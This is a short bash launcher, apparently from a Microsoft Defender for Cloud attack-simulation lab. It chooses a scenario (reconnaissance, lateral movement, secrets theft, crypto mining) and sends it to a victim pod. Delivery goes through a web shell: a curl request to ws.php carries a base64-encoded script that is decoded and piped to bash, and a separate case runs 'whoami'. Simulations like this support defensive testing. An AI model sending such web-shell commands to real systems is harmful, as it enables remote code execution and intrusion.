#!/bin/bash

# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

sleep 10
echo "Started at `date`"
echo " "
case $SCENARIO in
    recon)
        attack_script=recon.sh
        ;;
    lateral-mov)
        attack_script=lateral-mov.sh
        ;;
    secrets)
        attack_script=secrets-and-files.sh
        ;;
    crypto)
        attack_script=crypto.sh
        python3 -m http.server 80 > /dev/null 2>&1 &
        sleep 2
        ;;
    all)
        attack_script=all-scenarios.sh
        python3 -m http.server 80 > /dev/null 2>&1 &
        sleep 2
        ;;
    webshell)
        echo "--- Webshell ---"
        echo "Sending command \"whoami\" to victim"
        curl -Gs --data-urlencode "cmd=whoami" "http://mdc-simulation-victim/ws.php" | sed '/<!--/,/-->/d'
        echo " "
        echo "--- Simulation completed ---"
        exit
        ;;
    *)
        echo "No matching scenario found. exiting"
        exit
        ;;
    esac
script_b64=$(cat $attack_script | base64 -w0)
echo "--- Webshell ---"
echo "Sending payload request to the victim pod"
echo " "
curl -Gs --data-urlencode "cmd=echo $script_b64| base64 -d| bash" "http://mdc-simulation-victim/ws.php"  | sed '/<!--/,/-->/d'
echo "--- Simulation completed ---"
